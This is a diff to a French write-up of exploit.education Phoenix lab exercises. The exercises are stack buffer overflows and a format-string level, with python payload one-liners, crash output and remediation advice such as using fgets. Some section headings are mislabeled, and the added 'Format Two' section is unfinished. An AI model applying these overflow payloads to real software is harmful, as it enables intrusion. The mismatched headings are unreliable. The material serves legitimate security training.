@@ -45,7 +45,9 @@ CWE-126 : Buffer Over-read
 
 - Envoyer 64 caractères de remplissage + la valeur 0x496c5962 en little-endian.
 
-- Soluce  : ./stack-one $(python -c 'print "A"*64 + "\x62\x59\x6c\x49"')
+```bash 
+./stack-one $(python -c 'print "A"*64 + "\x62\x59\x6c\x49"')
+```
 
 #### Find CWE Linked to the Weakness
 
@@ -86,7 +88,7 @@ locals.buffer[sizeof(locals.buffer)-1] = '\0';
 
 - Ou vérifier la longueur avant la copie.
 
-### 3.4 Stack Two
+### 3.4 Stack Three
 
 #### Identify the Weakness
 
@@ -105,7 +107,6 @@ locals.buffer[sizeof(locals.buffer)-1] = '\0';
 #### Remediation
 
 - remplacer gets par fgets(buffer, sizeof(buffer), stdin) et utiliser systématiquement des fonctions sûres pour les entrées utilisateur.
-
 
 ## 4.1 Format Zero
 
@@ -172,7 +173,7 @@ sprintf(locals.dest, "%s", buffer)
 snprintf(locals.dest, 32, "%s", buffer)
 ```
 
-### 6.1 Format One
+### 6.1 Stack Four
 
 #### Identify the Weakness
 
@@ -195,8 +196,8 @@ python3 -c 'print("0"*64 + "A"*8 + "B"*8 + "C"*8 + "D"*8)' | ./stack-four
 Welcome to phoenix/stack-four, brought to you by https://exploit.education
 and will be returning to 0x4444444444444444
 Segmentation fault
-
 ```
+
 0x44 = D
 Donc il me faut un offset de 3*8 = 24
 D'ou l acommande suivante :
@@ -212,3 +213,30 @@ python3 -c 'print("0"*88 + "\x1d\x06\x40")' | ./stack-four
 #### Remediation
 
 Remplacer gets() par fgets(buffer, sizeof(buffer), stdin).
+
+### Format Two
+
+#### Identify the Weakness
+
+- gets(buffer) dans start_level() lit sans limite dans un buffer de 64 octets.
+
+- L'overflow permet d'écraser le pointeur de return de la fonction.
+
+#### Try to Exploit the Weakness 
+
+```bash 
+objdump -t ./format-two
+```
+
+0000000000600af0 g     O .bss	0000000000000004 changeme
+
+d'ou l'adresse : 0x600af0
+
+
+
+#### Find CWE Linked to the Weakness
+
+
+
+#### Remediation
+
